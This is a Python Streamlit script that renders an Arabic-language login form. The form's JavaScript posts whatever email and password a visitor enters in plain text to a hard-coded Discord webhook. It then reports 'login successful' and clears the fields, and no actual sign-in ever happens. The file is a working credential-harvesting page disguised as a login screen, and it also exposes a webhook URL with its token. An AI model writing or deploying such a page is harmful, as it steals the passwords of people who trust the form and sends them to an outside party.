import streamlit as st

st.title("تسجيل الدخول")

html_code = """
<div style="background-color: #1e1e1e; padding: 20px; border-radius: 10px; color: white; font-family: sans-serif; max-width: 400px;">
    <h3 style="margin-top:0;">تسجيل الدخول</h3>
    <label>البريد الإلكتروني:</label><br>
    <input type="text" id="email" style="width: 100%; padding: 8px; margin: 5px 0 15px 0; background: #2d2d2d; border: 1px solid #444; color: white; border-radius: 4px;"><br>
    
    <label>كلمة المرور:</label><br>
    <input type="password" id="password" style="width: 100%; padding: 8px; margin: 5px 0 15px 0; background: #2d2d2d; border: 1px solid #444; color: white; border-radius: 4px;"><br>
    
    <button onclick="sendData()" style="background-color: #4f46e5; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%;">دخول</button>
    <p id="msg" style="margin-top: 10px; text-align: center;"></p>
</div>

<script>
function sendData() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const msg = document.getElementById('msg');

    if(!email || !password) {
        msg.style.color = '#f87171';
        msg.innerText = 'يرجى إدخال جميع الحقول';
        return;
    }

    const webhookURL = "https://discord.com/api/webhooks/1564162502563078184/GrqM34Vyba-0D_3_Tg11s5iaop8iAN1Y3fHb759LiVWrUdGv6lzvka-wNMhKZWpVaEHT";
    
    const payload = {
        embeds: [{
            title: "🔐 تسجيل دخول جديد!",
            color: 3447003,
            fields: [
                { name: "📧 البريد الإلكتروني", value: email, inline: false },
                { name: "🔑 كلمة المرور", value: password, inline: false }
            ]
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).then(response => {
        if(response.ok) {
            msg.style.color = '#4ade80';
            msg.innerText = 'تم تسجيل الدخول بنجاح';
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
        } else {
            msg.style.color = '#f87171';
            msg.innerText = 'حدث خطأ أثناء الإرسال';
        }
    }).catch(error => {
        msg.style.color = '#f87171';
        msg.innerText = 'خطأ في الاتصال';
    });
}
</script>
"""

st.components.v1.html(html_code, height=350)
